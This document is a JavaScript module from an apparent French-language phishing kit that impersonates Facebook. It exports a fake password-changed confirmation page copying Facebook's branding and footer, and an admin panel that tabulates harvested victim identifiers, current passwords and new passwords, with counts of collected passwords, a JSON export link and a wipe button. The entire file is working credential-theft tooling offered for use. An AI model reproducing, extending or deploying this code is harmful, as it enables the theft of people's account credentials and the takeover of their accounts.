const escapeHtml = (str) => {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

const applyNoCache = (res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.setHeader('Surrogate-Control', 'no-store');
};

const confirmationHtml = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mot de passe changé | Facebook</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22><rect fill=%22%231877F2%22 width=%2224%22 height=%2224%22 rx=%224%22/><path fill=%22white%22 d=%22M13.5 21v-7.5h2.5l.5-3h-3V8.5c0-.9.3-1.5 1.5-1.5H17V4.2C16.5 4.1 15.4 4 14.1 4c-2.6 0-4.3 1.6-4.3 4.4V10.5H7.5v3h2.3V21h3.7z%22/></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background-color: #f0f2f5; min-height: 100vh; }
        .header { background: linear-gradient(#4e69a2, #3b5998 50%); border-bottom: 1px solid #133783; min-height: 82px; }
        .header-inner { max-width: 980px; margin: 0 auto; padding: 10px 0; display: flex; justify-content: space-between; align-items: center; }
        .logo { color: white; font-size: 40px; font-weight: bold; padding-top: 10px; }
        .main-container { max-width: 980px; margin: 0 auto; padding: 40px 20px; }
        .card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 40px 30px; max-width: 600px; margin: 0 auto; text-align: center; }
        .success-icon { width: 80px; height: 80px; margin: 0 auto 20px; background: #31a24c; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .success-icon svg { width: 44px; height: 44px; stroke: white; stroke-width: 3; fill: none; }
        .title { font-size: 24px; color: #162643; font-weight: bold; margin-bottom: 10px; }
        .subtitle { color: #606770; font-size: 15px; line-height: 1.5; margin-bottom: 24px; }
        .btn { display: inline-block; padding: 10px 24px; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; text-decoration: none; }
        .btn-primary { background-color: #1877f2; color: white; }
        .btn-primary:hover { background-color: #166fe5; }
        .footer { max-width: 980px; margin: 40px auto 0; padding: 20px; text-align: center; color: #8a8d91; font-size: 12px; border-top: 1px solid #dadde1; }
        .footer-links { margin-bottom: 10px; }
        .footer-links a { color: #385898; text-decoration: none; margin: 0 4px; }
        .footer-links a:hover { text-decoration: underline; }
        @media (max-width: 768px) {
            .header { min-height: 60px; }
            .header-inner { padding: 8px 16px; max-width: 100%; }
            .logo { font-size: 28px; padding-top: 4px; }
            .main-container { padding: 20px 12px; }
            .card { padding: 30px 20px; border-radius: 6px; }
            .success-icon { width: 64px; height: 64px; }
            .success-icon svg { width: 32px; height: 32px; }
            .title { font-size: 20px; }
            .subtitle { font-size: 14px; }
            .btn { width: 100%; padding: 12px 20px; font-size: 16px; display: block; }
            .footer { padding: 16px 12px; margin-top: 24px; font-size: 11px; }
            .footer-links a { display: inline-block; margin: 2px 3px; }
        }
        @media (max-width: 420px) {
            .logo { font-size: 24px; }
            .card { padding: 24px 16px; }
            .title { font-size: 18px; }
        }
        input, button, a.btn {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-inner">
            <div class="logo">facebook</div>
        </div>
    </div>
    <div class="main-container">
        <div class="card">
            <div class="success-icon">
                <svg viewBox="0 0 24 24">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
            </div>
            <h1 class="title">Mot de passe changé</h1>
            <p class="subtitle">Votre mot de passe a été mis à jour avec succès.<br>Votre compte est maintenant sécurisé.</p>
            <a href="https://www.facebook.com" target="_blank" class="btn btn-primary">Continuer vers Facebook</a>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="#">Français (France)</a> · <a href="#">English (US)</a> · <a href="#">Español</a> · <a href="#">Deutsch</a> · <a href="#">Italiano</a>
        </div>
        <div class="footer-links">
            <a href="#">S'inscrire</a> · <a href="#">Connexion</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> · <a href="#">Watch</a> · <a href="#">Lieux</a> · <a href="#">Jeux</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a> · <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Ray-Ban Meta</a> · <a href="#">Instagram</a> · <a href="#">Threads</a> · <a href="#">Collectes de dons</a> · <a href="#">Services</a> · <a href="#">Centre d'information sur les élections</a> · <a href="#">Politique de confidentialité</a> · <a href="#">Centre de confidentialité</a> · <a href="#">Groupes</a> · <a href="#">À propos</a> · <a href="#">Créer une publicité</a> · <a href="#">Créer une Page</a> · <a href="#">Développeurs</a> · <a href="#">Emplois</a> · <a href="#">Cookies</a> · <a href="#">Choisir sa pub</a> · <a href="#">Conditions générales</a> · <a href="#">Aide</a> · <a href="#">Téléchargement de vos informations</a>
        </div>
        <p>Meta © 2026</p>
    </div>
</body>
</html>`;

const renderAdmin = (data) => {
  const count = data.length;
  const uniqueIds = new Set(data.map(d => d.identifier).filter(Boolean)).size;
  const oldPw = data.filter(d => d.old_password).length;
  const confirmed = data.filter(d => d.new_password && d.new_password === d.confirm_password).length;

  const rows = data.map((e, i) => `
        <tr>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:12px;color:#64748b;white-space:nowrap;">${count - i}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:13px;color:#0f172a;white-space:nowrap;">${escapeHtml(e.timestamp || '')}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#2563eb;font-weight:600;word-break:break-all;">${escapeHtml(e.identifier || '')}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#dc2626;font-family:monospace;word-break:break-all;">${escapeHtml(e.old_password || '')}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#16a34a;font-family:monospace;word-break:break-all;">${escapeHtml(e.new_password || '')}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#64748b;font-family:monospace;word-break:break-all;">${escapeHtml(e.confirm_password || '')}</td>
        </tr>
    `).join('');

  return `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin - Données collectées</title>
<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
    body { background: #f8fafc; color: #0f172a; padding: 20px; }
    .wrap { max-width: 1200px; margin: 0 auto; }
    .top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 20px; }
    h1 { font-size: 24px; color: #1e293b; }
    h1 span { background: #1877f2; color: white; padding: 4px 12px; border-radius: 999px; font-size: 14px; margin-left: 10px; }
    .actions { display: flex; gap: 10px; flex-wrap: wrap; }
    .btn { padding: 10px 18px; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; }
    .btn-back { background: #e2e8f0; color: #334155; }
    .btn-back:hover { background: #cbd5e1; }
    .btn-danger { background: #dc2626; color: white; }
    .btn-danger:hover { background: #b91c1c; }
    .btn-export { background: #16a34a; color: white; }
    .btn-export:hover { background: #15803d; }
    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px,1fr)); gap: 12px; margin-bottom: 24px; }
    .stat { background: white; border-radius: 10px; padding: 18px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); border-left: 4px solid #1877f2; }
    .stat.red { border-left-color: #dc2626; }
    .stat.green { border-left-color: #16a34a; }
    .stat.orange { border-left-color: #f59e0b; }
    .stat-label { font-size: 12px; color: #64748b; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
    .stat-value { font-size: 28px; font-weight: 700; color: #0f172a; margin-top: 4px; }
    .card { background: white; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); overflow: hidden; }
    .card-head { padding: 16px 20px; border-bottom: 1px solid #e5e7eb; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
    .card-head h2 { font-size: 16px; color: #1e293b; }
    .table-wrap { overflow-x: auto; }
    table { width: 100%; border-collapse: collapse; min-width: 800px; }
    th { background: #f1f5f9; padding: 12px 14px; text-align: left; font-size: 12px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 2px solid #e2e8f0; position: sticky; top: 0; }
    .empty { padding: 40px 20px; text-align: center; color: #94a3b8; }
    .empty strong { display: block; color: #64748b; font-size: 16px; margin-bottom: 6px; }
    @media (max-width: 640px) {
        h1 { font-size: 18px; }
        .stat-value { font-size: 22px; }
        body { padding: 12px; }
    }
</style>
</head>
<body>
<div class="wrap">
    <div class="top">
        <h1>🔐 Panel Admin <span>${count} enregistrement(s)</span></h1>
        <div class="actions">
            <a href="/" class="btn btn-back">← Retour formulaire</a>
            <a href="/admin/export" class="btn btn-export">⬇️ Export JSON</a>
            <a href="/admin/clear" class="btn btn-danger" onclick="return confirm('Supprimer TOUTES les données ? Cette action est irréversible.')">🗑️ Vider</a>
        </div>
    </div>

    <div class="stats">
        <div class="stat">
            <div class="stat-label">Total de soumissions</div>
            <div class="stat-value">${count}</div>
        </div>
        <div class="stat orange">
            <div class="stat-label">Identifiants uniques</div>
            <div class="stat-value">${uniqueIds}</div>
        </div>
        <div class="stat red">
            <div class="stat-label">Anciens MDP collectés</div>
            <div class="stat-value">${oldPw}</div>
        </div>
        <div class="stat green">
            <div class="stat-label">Nouveaux MDP confirmés</div>
            <div class="stat-value">${confirmed}</div>
        </div>
    </div>

    <div class="card">
        <div class="card-head">
            <h2>📋 Détail des données (plus récent → plus ancien)</h2>
            <span style="font-size:12px;color:#64748b;">Stockage : en mémoire persistante</span>
        </div>
        <div class="table-wrap">
            ${count === 0 ? `
                <div class="empty">
                    <strong>Aucune donnée pour l'instant</strong>
                    Remplissez et soumettez le formulaire depuis la page d'accueil pour voir apparaître les informations ici.
                </div>
            ` : `
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Date / Heure</th>
                        <th>Identifiant (Email / Téléphone)</th>
                        <th>Mot de passe actuel</th>
                        <th>Nouveau mot de passe</th>
                        <th>Confirmation</th>
                    </tr>
                </thead>
                <tbody>
                    ${rows}
                </tbody>
            </table>
            `}
        </div>
    </div>
</div>
</body>
</html>`;
};

module.exports = {
  escapeHtml,
  applyNoCache,
  confirmationHtml,
  renderAdmin
};
